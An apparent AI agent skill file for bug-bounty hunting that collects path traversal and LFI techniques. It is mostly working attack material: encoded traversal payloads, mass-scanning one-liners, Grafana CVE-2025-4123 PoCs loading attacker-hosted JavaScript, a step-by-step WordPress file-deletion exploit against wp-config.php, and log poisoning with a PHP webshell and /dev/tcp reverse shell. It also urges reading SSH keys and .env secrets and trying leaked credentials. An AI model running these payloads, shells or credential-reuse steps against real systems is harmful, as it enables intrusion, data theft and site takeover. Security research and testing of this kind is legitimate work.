---
name: path-traversal-testing
description: Path traversal / directory traversal exploitation — finding and abusing file-path parameters (download, image, document, log, backup endpoints) that let an attacker escape the intended directory and read arbitrary server files. Use this during Phase 3 (Vulnerability Testing — Info disclosure/Injection) of bughunting-workflow whenever the hunter is testing any endpoint that takes a filename/path parameter, or mentions path traversal, directory traversal, LFI, arbitrary file read, ../ payloads, or dot-dot-slash.
---

# Path Traversal Testing

General technique library for finding and exploiting path traversal (directory traversal) vulnerabilities. Recorded techniques below accumulate from multiple source writeups — add new dated entries rather than creating a new skill when another path-traversal writeup is processed.

## Core theory

Occurs when user input is used to build a file path on the server without proper validation/normalization:
```python
file = request.GET["file"]
path = "/var/www/files/" + file
open(path)
```
The app assumes `file` stays inside `/var/www/files/`, but nothing stops it from containing `../` sequences that walk up out of that directory. A request for `?file=../../../../etc/passwd` makes the server open `/etc/passwd` instead.

Common root causes to look for:
- Direct string concatenation of user input into a file path
- User-controlled filenames with no allowlist/validation
- Filters that block literal `../` but don't handle encoded variants
- No path normalization before the file-system call
- File-handling logic (templates, images, docs) that trusts user input

## Where to look (recon signal)

Any endpoint that takes a file/path/document identifier as a parameter is a candidate — prioritize these during Phase 1/2 recon and flag them for this technique in Phase 3:
- File download: `download.php?file=invoice.pdf`
- Image/asset loading: `/images?img=logo.png`
- Document viewers: `/view?doc=manual.pdf`
- Log viewers: `/logs?file=access.log`
- Backup download features
- Any template/include mechanism that takes a name and loads a file

## Payload variants (escalate in this order when testing)

1. **Basic traversal**: `../../../../etc/passwd` (Linux) — repeat `../` enough times to guarantee reaching root regardless of actual nesting depth.
2. **Absolute path**: skip traversal entirely and request the absolute path directly — `/etc/passwd` (Linux) or `C:\Windows\System32\drivers\etc\hosts` (Windows) — works if the app doesn't reject absolute paths.
3. **URL-encoded traversal**: if literal `../` is filtered, encode it — `..%2f..%2f..%2fetc%2fpasswd` (`%2f` = `/`). Try encoding just the slash, just the dots, or both, since filters vary in what they check.
4. **Double encoding**: if the filter decodes only once, encode twice — `..%252f..%252f..%252fetc%252fpasswd` (decodes to `../` only after two passes, bypassing single-decode filters).
5. **Null byte injection**: on older stacks that don't reject embedded nulls, append `%00` plus a harmless extension to defeat extension allowlists — `../../etc/passwd%00.jpg` (string processing stops at the null byte, but the extension check sees `.jpg`). Mostly relevant on legacy/older language runtimes now, but still worth one attempt on old-looking targets.

Since filters differ per target, don't stop at the first payload that fails — cycle through all variants above (and OS-appropriate targets: `/etc/passwd`, `/etc/hosts`, `win.ini`, `web.config`, application config/`.env` files) before concluding the parameter isn't vulnerable.

## Escalation: what to go after once file read is confirmed

A confirmed traversal read is the start, not the finish — the real severity comes from what you pull next. Once you can read arbitrary files, work through these targets in order of how directly they escalate:

1. **Source code** (`index.php`, `server.js`, `app.py`, `settings.py`, etc.) — read it for hidden API endpoints, hardcoded credentials, internal logic flaws, and other vulnerabilities. Source exposure often chains into a *second* vuln (e.g. `Path Traversal → Source Code Leak → SQL Injection → Database Dump`).
2. **Configuration/secret files** (`.env`, `config.php`, `database.yml`, `settings.py`) — these routinely contain DB credentials, API tokens, encryption keys, cloud credentials. A hit here can chain straight to backend or cloud infrastructure access (`Path Traversal → .env Exposure → Cloud Credentials → Cloud Infrastructure Access`).
3. **SSH private keys** (`/home/user/.ssh/id_rsa`) — if exposed without a passphrase, this is a direct path to server login, i.e. full server access, not just file read.
4. **Log files** (`/var/log/apache2/access.log`, `/var/log/nginx/error.log`) — leak internal endpoints, session tokens, user activity, and internal path structure; useful for mapping the app even when they don't directly hand over credentials.

**Chaining mindset:** treat every traversal finding as step one of a chain, not the whole report. `Path Traversal → Configuration File → Database Credentials → Data Breach` is the general shape. Programs pay more (and rate higher) for a demonstrated chain than for a bare file-read — always attempt to walk at least one step further (read a config, find a credential, try it) before writing up, rather than stopping at "I can read /etc/passwd."

## Recorded technique: LFI discovery/exploitation command reference
Source: [Recon to Master: The Complete Bug Bounty Checklist](https://infosecwriteups.com/recon-to-master-the-complete-bug-bounty-checklist-95b80ea55ff0)

This fills part of the live-tooling gap noted below (still missing Part 2's discovery methodology specifically, but this gives the automatable command side):

```bash
# Nuclei automated LFI templates across a subdomain list
nuclei -l subs.txt -t nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30

# gf lfi pattern filter + FFUF payload sweep against candidate params
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u \
  | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:[x*]:0:0:" -v

# Direct /etc/passwd probe across every gf-lfi-flagged URL, parallelized
gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c \
  'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# httpx path-list sweep against a single known parameter
echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt \
  -threads 50 -random-agent -mc 200 -mr "root:[x*]:0:0:"

# hakrawler-discovered params swept with an LFI wordlist
cat targets.txt | hakrawler | grep "=" | dedupe | httpx -silent -paths lfi_wordlist.txt \
  -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200
```
`gf lfi` is the same tomnomnom-pattern-filtering approach used for XSS/SQLi elsewhere (see `recon-scanning-toolkit`) — pre-filters the full URL list down to parameters shaped like file-path inputs before spending FFUF/httpx cycles on them. The `root:[x*]:0:0:` / `root:x` match strings are the confirmation signal — that's the start of a real `/etc/passwd` on a Linux target.

## Impact framing for report

A single vulnerable file parameter can expose configuration files, API keys, database credentials, source code, or SSH keys — not just `/etc/passwd`. When reporting, target the config/credential files relevant to the stack you fingerprinted in Phase 1/2 recon, and where possible demonstrate the next step in the chain (e.g. a leaked credential actually works), since that's what turns this into a high-impact finding instead of a low-severity info-disclosure note.

## Prevention/detection notes (useful for validating a fix or explaining remediation in a report)

- **Whitelisting**: restrict requestable files to a predefined list instead of accepting arbitrary filenames.
- **Path normalization + prefix check**: resolve the final path and verify it still starts with the intended base directory before opening it:
  ```python
  import os
  BASE_DIR = "/files"
  file_path = os.path.join(BASE_DIR, user_input)
  file_path = os.path.realpath(file_path)
  if not file_path.startswith(BASE_DIR):
      raise Exception("Access denied")
  open(file_path)
  ```
  When retesting a "fixed" endpoint, specifically try to defeat this pattern with the encoded/double-encoded/absolute-path variants above — a naive fix that only blocks literal `../` is a common incomplete-fix bug worth flagging.
- Defense-in-depth signals a program might already have (less likely to be exploitable, but worth noting in scope decisions): least-privilege file permissions, secrets stored outside app files, framework-level path-safety helpers.

## Recorded technique: client-side path traversal → XSS/Open Redirect/SSRF chain (Grafana CVE-2025-4123)
Source: [How One Path Traversal in Grafana Unleashed XSS, Open Redirect, and SSRF (CVE-2025-4123)](https://infosecwriteups.com/how-one-path-traversal-in-grafana-unleashed-xss-open-redirect-and-ssrf-cve-2025-4123-b35245dccaab)

**Where:** client-side routing/resource-loading logic, not a server-side file-read endpoint — this is a different flavor of traversal than the rest of this skill's entries. Grafana's frontend builds plugin-resource URLs out of the browser's own path (used for plugin loading/navigation under `/a/<plugin-id>/...` routes) without normalizing or rejecting `../`-style segments, encoded or not, before using that path to decide what to load.

**Root cause:** the frontend doesn't normalize/sanitize URL paths used for plugin loading and navigation, and doesn't reject traversal sequences that walk the resolved path *out* of the app's own asset directory and *into* an attacker-supplied host string embedded in the URL. Because the trust decision happens client-side against a path the attacker fully controls (the URL itself), the same underlying bug fans out into three different impacts depending on what gets loaded once the traversal breaks out:
- **Open redirect** — traversal walks the path out to an arbitrary external domain, which the frontend then navigates to.
- **XSS** — traversal is aimed at a path Grafana's plugin loader treats as a *plugin's own* `plugin.json`; pointing that at an attacker-hosted `plugin.json` whose `module` field is a remote URL gets that JS loaded and executed in the victim's authenticated session.
- **SSRF** — the same plugin-loading traversal, aimed at `127.0.0.1` instead of an attacker domain, makes the victim's browser (in an authenticated Grafana context) issue requests to internal/loopback addresses through the plugin mechanism.

**Exploit steps / PoC payloads** (all three share the same traversal shape — only the target host differs):

Open redirect:
```
https://domain.com/public/..%2F%5coast.pro%2F%3f%2F..%2F..
```
(`%2F` = `/`, `%5c` = `\` — mixing forward-slash and backslash encoding is the bypass: a filter that only normalizes one separator style misses the other.)

XSS via malicious plugin route — double-encoded traversal (`%252f` = `/` after one decode, `%255C` = `\` after one decode) walks out to an attacker-controlled path, then `#/explore` routes back into the app so the loader still treats it as an internal navigation:
```
/a/..%2f..%2f..%2fpublic%2f..%252f%255Cattacker.com%252f%253Fp%252f..%252f..%23/explore
```
Attacker-hosted `plugin.json` that the traversal tricks Grafana into loading as if it were a legitimate installed plugin — the `module` field is what actually pulls in and executes attacker JS:
```json
{
    "name": "ExploitPluginReq",
    "type": "app",
    "id": "grafana-lokiexplore-app",
    "enabled": true,
    "pinned": true,
    "autoEnabled": true,
    "module": "http://attacker.com/file?js=file",
    "baseUrl": "public/plugins/grafana-lokiexplore-app"
}
```
SSRF — identical shape, target swapped to loopback:
```
/a/..%2f..%2f..%2fpublic%2f..%252f%255C127.0.0.1%252f%253Fp%252f..%252f..%23/explore
```

**Fix:** Grafana 11.0.1 patched this via path normalization, rejecting external domains from resolving inside the internal routing/plugin-loading logic, and proper string escaping. When retesting a patched instance, specifically retry the double-encoded and mixed-slash variants above — a partial fix that only blocks single-encoded `../` or only forward-slash traversal is the same incomplete-fix trap called out elsewhere in this skill.

**Impact framing for report:** chain this past "path traversal" alone — the XSS variant runs in the victim's authenticated Grafana session (dashboards, data source credentials, admin actions reachable depending on the victim's role), which the source article frames as enabling account takeover; the SSRF variant is a foothold for internal network reconnaissance from the browser's authenticated context. Report all three PoCs together as one root-cause finding with three demonstrated impacts rather than three separate low-severity reports — that's what earned this a CVE and "high severity" framing rather than a bare info-disclosure note.

**Generalize beyond Grafana:** this is the client-side sibling of the server-side "check-then-use" pattern the rest of this skill covers — any frontend that builds a resource-loading or navigation URL out of a path segment it doesn't fully control (plugin/module loaders, iframe `src` builders, client-side routers that resolve relative paths against attacker input) is a candidate for the same three-way fan-out: walk the path to an external host for open redirect, walk it to a resource the app treats as trusted (a manifest/config file format that itself specifies a remote script/module) for XSS, or walk it to an internal/loopback address for SSRF. Test with the same escalating encoding ladder as the rest of this skill (plain traversal → single URL-encode → double URL-encode → mixed separator encoding), since client-side path-handling filters are exactly as prone to the single-decode/single-separator gap as server-side ones. Cross-reference `open-redirect-testing` and `ssrf-testing` for the broader payload catalogs on those two individual impacts once a candidate parameter is found this way.

## Recorded technique: multi-step metadata poisoning → arbitrary file deletion (WordPress core/Gutenberg, CWE-73)
Source: HackerOne report [#3931777 — Author → arbitrary file deletion anywhere on disk (site takeover) via `POST /wp/v2/media/<id>/finalize` poisoning `_wp_attachment_metadata`](https://hackerone.com/reports/3931777), program: WordPress, reporter: jakubk, disclosed 2026-08-28. Severity: **Critical 9.9** (CVSS `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`; reporter notes it's 8.8 if you disagree on Scope-changed). Bounty amount not shown publicly on the disclosed report. Resolved in WordPress 7.1 / Gutenberg (fix PRs: `gutenberg#78128`, `gutenberg#79307`, core changesets r62616/r63200).

**Where:** WordPress's client-side media processing REST endpoint `POST /wp/v2/media/<id>/finalize` — added by the Gutenberg plugin (unconditionally enabled ≥23.6.0) and present in WP core trunk 7.1+ (enabled by default whenever `is_ssl()` is true, i.e. every production HTTPS site, or on any `localhost`/`*.localhost` host). Requires only the **Author** role (`upload_files` + `edit_post` on the attacker's *own* uploaded attachment) — no admin/editor privilege needed.

**Root cause — a 4-stage write-then-launder-then-delete chain, not a single bad parameter:**
1. **Unsanitized write primitive.** `finalize_item()` writes attacker-supplied `sub_sizes[*].file` (and the top-level `file` key) verbatim into `_wp_attachment_metadata` — no `sanitize_callback`, no `wp_basename()`, no `sanitize_file_name()` anywhere on that code path. The REST schema for the field is just `array('type' => 'string')`.
2. **Legitimate feature launders the poisoned value into *protected* meta.** The classic "Edit Image" popup (`wp_ajax_image_editor()`, gated only by `edit_post` + a nonce WordPress prints to the Author itself in the media library UI) copies the attacker's poisoned per-size entry verbatim into `_wp_attachment_backup_sizes` — a meta key the app otherwise treats as trusted/internal.
3. **The one broken branch.** `wp_delete_attachment_files()` has several branches that each derive a confinement directory to check a deletion target against before unlinking. Every branch except one derives that confinement directory from `get_attached_file()` (trusted, server-side). The `$backup_sizes` branch alone derives **both** the deletion target *and* the confinement directory from the same attacker-controlled `$meta['file']` — so the "is this path inside the allowed directory" check is comparing attacker input against attacker input and always passes.
4. **`path_join()` returns an absolute path unchanged.** Since the poisoned `file` value can itself be an absolute path or contain `../`, the "confined" delete target can point anywhere the PHP process can `unlink()` — inside or entirely outside the webroot/uploads directory.

**Exploit steps (from the report, WordPress 7.0.2 + Gutenberg 23.6.0, Author-only, application-password auth):**
```bash
AP=<author1 application password>
B=http://localhost:8356

# [1] Author uploads a real JPEG (legitimate action, needed to get an attachment ID)
curl -u "author1:$AP" -H "Content-Disposition: attachment; filename=zap4.jpg" \
  -H "Content-Type: image/jpeg" --data-binary @zap.jpg \
  -X POST "$B/?rest_route=/wp/v2/media"                         # 201, id=8

# [2] Poison one sub-size filename with the name of the file to destroy
curl -u "author1:$AP" -X POST -H "Content-Type: application/json" \
  -d '{"sub_sizes":[{"image_size":"thumbnail","file":"wp-config.php",
       "width":150,"height":150,"mime_type":"image/jpeg","filesize":1}]}' \
  "$B/?rest_route=/wp/v2/media/8/finalize"                      # 200

# [3] Read the image_editor-<id> nonce WordPress prints to the Author, then launder
#     the poisoned entry into the protected _wp_attachment_backup_sizes meta
curl -b author.jar "$B/wp-admin/media-upload.php?tab=library"   # imageEdit.open( 8, "72cf52ebf1" )
curl -b author.jar -X POST "$B/wp-admin/admin-ajax.php" \
  -d 'action=image-editor&_ajax_nonce=72cf52ebf1&postid=8&do=save&target=all' \
  --data-urlencode 'history=[{"r":90}]'                          # 200 {"success":true,...}

# [4] Re-poison the top-level metadata['file'] to escape the uploads root entirely
curl -u "author1:$AP" -X POST -H "Content-Type: application/json" \
  -d '{"sub_sizes":[{"image_size":"original","file":"../../x.jpg",
       "width":600,"height":400,"filesize":1}]}' \
  "$B/?rest_route=/wp/v2/media/8/finalize"                      # 200

# [5] Author deletes its OWN attachment — the delete cascades into the poisoned backup_sizes entry
curl -u "author1:$AP" -X DELETE "$B/?rest_route=/wp/v2/media/8&force=true"   # 200
```
Observed result: `wp-config.php` gone (`ls: cannot access` after, md5 matched before), and `GET /` now 302-redirects to `/wp-admin/setup-config.php` — the unauthenticated reinstall wizard. A second run in the same report used an **absolute path completely outside the document root** (`/home/kali/.../victimdir/anything.jpg`) as step 4's payload and deleted a file in that directory too — proving the traversal isn't confined to the webroot or even the filesystem tree WordPress lives in.

**Negative controls the reporter ran (worth replicating on any similar finding to preempt a "that's just IDOR" or "not really Author-reachable" objection):** a Contributor attempting step 2 on any attachment gets `403 rest_cannot_edit_image`; an Author attempting step 2 on an *Administrator's* attachment gets `403 rest_cannot_edit`. The attack only works through an attachment the attacker uploaded themselves — this is a privilege-escalation/sandbox-escape bug (Author → arbitrary-file-delete), not a horizontal-authorization bug, and demonstrating that distinction with negative controls is itself valuable proof.

**Fix:** two independent hardenings, both applied — (1) `finalize_item()` now runs every `sub_size['file']`/`original_image'` through `wp_basename()` + `sanitize_file_name()` and rejects the request if the value changes (i.e. it contained a path separator or traversal sequence at all); (2) the sink itself (`wp_delete_attachment_files()`'s `$backup_sizes` branch) now derives its confinement directory from `_wp_relative_upload_path()`/trusted data instead of the attacker-controlled `$meta['file']`, matching how every other branch of that function already worked.

**Impact framing for report:** Critical — lowest-privileged content role (Author, routinely handed to guest bloggers/freelance contributors) reaches arbitrary file deletion anywhere the web server's PHP process can unlink, with zero user interaction and five HTTP requests. Chain framing matters for severity: don't stop at "I deleted a file" — walk it to `wp-config.php` specifically (forces the reinstall wizard, handing the next unauthenticated visitor the ability to point the install at their own DB and become admin → RCE via the plugin/theme editor) and note the shared-hosting angle (deleting files entirely outside the docroot can reach other tenants' data on shared infrastructure) — both of those are what justified Critical/9.9 rather than a Medium "arbitrary file delete" rating alone.

**Generalize note — the reusable pattern, independent of WordPress:** *"one branch out of several builds its own path-confinement guard from the same untrusted value it's supposed to be validating."* Whenever auditing any containment/sandbox/allowlist check (`is_path_inside(target, allowed_dir)`), explicitly ask where `allowed_dir` itself comes from — if it's derived from the same request/stored-value the attacker controls, the check is a tautology, not a guard, no matter how correct the comparison logic looks. Also generalize the **laundering step**: a value poisoned through one endpoint (the REST `finalize` write) only became dangerous after a *second, unrelated, legitimate* feature (the image-editor AJAX action) copied it verbatim into a meta key the rest of the app implicitly trusts — when hunting, trace not just "where does user input get used unsafely" but "does any other legitimate feature copy this same stored value into a field that a *different*, more-trusted code path later consumes without re-validating." This pattern generalizes well beyond WordPress to any app doing client-side upload/processing where metadata about an upload flows through more than one internal feature before reaching a filesystem sink. Distinguish from the superficially similar 2018 bug the reporter cited as prior art (`CVE-2018-12895`, a different metadata key `thumb` and a different entry point `wp-admin/post.php?action=editattachment`, fixed key-specifically in 4.9.7) — same sink function, different poisoned key and different branch, which is exactly why the old fix didn't cover this one; when a target has a historical CVE for "the same sink function," specifically check whether the fix covered *every* branch/key that reaches that sink or just the one that was reported.

**Process note worth keeping regardless of the bug itself:** the disclosed report's comment thread includes the reporter flagging, after disclosure, that HackerOne's own CVE-ID field on the report shows `CVE-2018-12895` — which is actually the *prior-art* CVE cited in the report body, not a CVE for this new bug. A reminder that a report's structured metadata fields (CVE ID, asset tag) can be auto-populated wrong or left over from a citation, and the activity-timeline comments are sometimes the only place that correction shows up — always read the full timeline, not just the report body and the severity/CVE fields in the sidebar.

## Recorded technique: blind path traversal via directory-creation error oracle (no file read/write visibility needed)

Source: [Escalating a Blind Upload to RCE via Path Traversal into Cron and DNS-Restricted Callback Bypass](https://medium.com/bugbountywriteup/escalating-a-blind-upload-to-rce-via-path-traversal-into-cron-and-dns-restricted-callback-bypass-0f63db01be92)

**Where:** any file-upload endpoint that accepts an attacker-controlled destination-directory field (e.g. `uploadPath`) alongside the file itself, where the traversed path is never displayed back and the response gives no direct filesystem-read capability — only a generic success/error status for the write.

**Root cause:** the upload handler concatenates the client-supplied directory value directly into the filesystem destination path with no normalization, canonicalization, or allowlist check, and (separately) its directory-creation step returns a distinguishable error when the target path component already exists as a *non-directory* file rather than silently succeeding or failing uniformly.

**Exploit steps — turning a write-only endpoint into a filesystem-existence oracle:**
1. Confirm real traversal first with a long `../../../../…` prefix (14 repetitions covers most deployment depths) against a handful of always-present system directories (`/etc`, `/tmp`, `/root`) versus one that reliably doesn't behave like a normal directory (`/proc`) — a distinct error on `/proc` alone confirms the traversal is hitting the real filesystem rather than being sandboxed/normalized away.
2. Success on `/root` as a destination (HTTP 201, no permission error) is itself a finding: it means the upload-handling process runs as root.
3. Build the oracle: request directory creation *inside* a specific file's own path (`uploadPath=<traversal>/etc/redhat-release/x`) — if that specific file exists as a regular file (not a directory), the server's `mkdir`-equivalent call fails trying to treat it as a directory component, and that failure is distinguishable in the response from an ordinary "path doesn't exist yet, created fine" success. Existence of `/etc/redhat-release` implies RHEL/CentOS; existence of `/etc/cron.d/0hourly` implies cron is installed; existence of `/usr/sbin/crond` implies the daemon is present.
4. Each such probe is a single yes/no bit about the target filesystem — walk a list of OS-fingerprint/service-fingerprint candidate paths this way to build an OS and installed-software profile with zero direct file-read access, purely from upload-directory-creation error/success differences.

**Impact:** OS/service fingerprinting entirely through a write-only, response-opaque endpoint — no download path, no directory listing, no error message containing file contents. This oracle is also what later confirmed blind command output (see the companion technique in `rce-exploitation-testing`'s cron-execution entry — the exact same existence-oracle mechanism, repointed at attacker-chosen filenames encoding command output).

**Generalize note:** the core insight — *"a write endpoint that returns only success/failure still leaks one bit of filesystem truth per request if directory-creation semantics differ between 'path didn't exist' and 'path exists as a non-directory'"* — applies to any upload, move, copy, or extract endpoint with a destination-path parameter, not just this one. Always test the failure-mode granularity (does the endpoint distinguish "already exists as file" from "already exists as directory" from "parent doesn't exist"?) before assuming a write-only endpoint gives no read-side information at all.

## Recorded technique: LFI → RCE via SSH/Apache log poisoning, plus `php://filter` source-disclosure escalation
Source: [Ha-Natraj: LFI → Log Poisoning → Apache2 User Hijack → sudo nmap to Root (OffSec PG Play)](https://freedium-mirror.cfd/https://infosecwriteups.com/ha-natraj-lfi-log-poisoning-apache2-user-hijack-sudo-nmap-to-root-offsec-pg-play-dbbd1fa12bee)

**Where:** a confirmed LFI (`include($file)` or equivalent) on a PHP target where `/var/log/auth.log` (or any attacker-influenceable log — Apache/nginx access logs via a crafted User-Agent are the equally common variant) is readable through the same traversal/inclusion point — this is the concrete RCE escalation path that `rce-exploitation-testing` flags as cross-referenced to this skill but that wasn't previously recorded here with a working payload.

**Root cause:** the LFI sink (`include()`/`require()` in PHP, or an equivalent template/file-load call in other languages) executes whatever PHP code is present in the included file's *content*, not just its filename — so any log file that (a) is reachable via the traversal and (b) records attacker-controlled input verbatim becomes a two-stage RCE primitive: stage one writes a payload into the log via the *unrelated* service that generates it (SSH login attempts, HTTP requests), stage two triggers execution by including that now-poisoned log through the LFI.

**Exploit steps:**
1. Confirm the LFI reads arbitrary files (`?file=/etc/passwd`) and specifically that a log file is both attacker-writable-by-proxy and includable: `curl "http://target/file.php?file=/var/log/auth.log"`.
2. Poison the log: connect to the service that writes to it, supplying the PHP payload as the logged field itself rather than as valid protocol data — for SSH's `auth.log`, the attempted *username* is what gets logged verbatim on a failed login:
```bash
echo '<?php system($_GET["cmd"]); ?>' | nc <target> 22
```
(Sending the payload as raw bytes to the SSH port is enough to get it logged as a failed-login attempt line containing the payload string — no valid SSH handshake needed.) The equally common HTTP variant poisons `access.log`/`error.log` via a malicious `User-Agent` header on an ordinary request instead.
3. Trigger execution by including the now-poisoned log *with the RCE parameter appended*, since the included PHP code's `$_GET['cmd']` reads from the same request that triggers the include:
```bash
curl "http://target/file.php?file=/var/log/auth.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker-ip>/4444+0>%261'"
```
The log's poisoned line executes as PHP at the point the LFI includes it, running the reverse-shell one-liner with whatever privileges the web server process has (`www-data`, typically).

**Source-disclosure escalation (useful before/alongside log poisoning, to confirm the exact sink and look for other bugs in the same file):** pull the LFI endpoint's own PHP source without executing it, using the `php://filter` stream wrapper to base64-encode the file content instead of letting PHP interpret it:
```bash
curl -s "http://target/file.php?file=php://filter/convert.base64-encode/resource=file.php" | base64 -d
```
This is how the exact vulnerable sink (`include("$file")`, unsanitized) gets confirmed directly from source rather than inferred from behavior — worth running on any LFI-confirmed endpoint before attempting log poisoning, since it may reveal additional parameters, included files, or validation logic worth testing around.

**Impact framing for report:** this converts a "medium" arbitrary-file-read LFI into full remote code execution — always test whether *any* log file reachable through a confirmed LFI can be poisoned through an unrelated, unauthenticated service (SSH, HTTP, FTP, mail) before reporting the LFI as read-only; the RCE escalation is almost always in scope for the same finding and dramatically changes severity.

**Generalize note:** the general pattern — "find a sink that writes attacker-controlled data verbatim, independent of the actual vulnerable inclusion point, then trigger inclusion of that now-poisoned data" — applies beyond SSH/Apache logs: PHP session files (`/var/lib/php/sessions/sess_<id>` via a session-cookie-set payload), mail spool files, FTP logs (vsftpd/proftpd), and even image/avatar-upload EXIF metadata are all documented poisoning vectors for the same LFI-to-RCE chain when the direct-upload-to-webroot path (`file-upload-testing`) isn't available. Cross-reference `rce-exploitation-testing`'s general command-injection/data-flow-first methodology — this is the LFI-specific instance of that same "find the sink before injecting" discipline.

## Source

Three-part series, "The Complete Guide to Path Traversal", by Ishant Gupta (rot-ig), Medium:
- Part 1 — [Path Traversal Vulnerability Explained](https://rot-ig.medium.com/path-traversal-vulnerability-explained-the-hidden-door-inside-web-applications-2f56474f9e75) — processed 2026-09-22. Concept/theory, payload types.
- Part 2 — "How Hackers Discover Path Traversal Vulnerabilities" (practical discovery methodology/tools) — **referenced by Part 3 but not yet processed; fetch and add when the hunter shares it.**
- Part 3 — [From Path Traversal to Full Server Access](https://rot-ig.medium.com/from-path-traversal-to-full-server-access-9f55b3226a93) — processed 2026-09-22. Escalation/chaining targets, prevention, practice labs (PortSwigger Web Security Academy, TryHackMe/HTB/PicoCTF, OWASP Juice Shop).

Note: this skill still lacks live discovery methodology/tooling detail (which endpoints to scan with what tool, fuzzing wordlists, Burp workflow) since Part 2 — the piece that would cover that — hasn't been processed yet.

<!-- Add new recorded techniques below this line as new path-traversal writeups are processed. -->
